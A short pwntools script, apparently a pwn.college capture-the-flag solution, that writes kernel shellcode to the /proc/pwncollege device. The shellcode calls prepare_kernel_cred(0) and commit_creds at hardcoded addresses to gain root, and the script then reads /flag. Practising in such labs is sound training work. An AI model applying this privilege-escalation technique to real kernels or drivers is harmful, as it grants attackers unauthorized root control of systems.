from pwn import *

context.arch = 'amd64'
shellcode = asm(""" xor rdi, rdi
    mov rax, 0xffffffff810890d0 #preparekernelcred
    call rax
    mov rdi, rax
    mov rax, 0xffffffff81088d90
    call rax
    ret """)

with open("/proc/pwncollege", 'wb') as f:
    f.write(shellcode)
with open("/flag", 'r') as flag:
    print(flag.read())
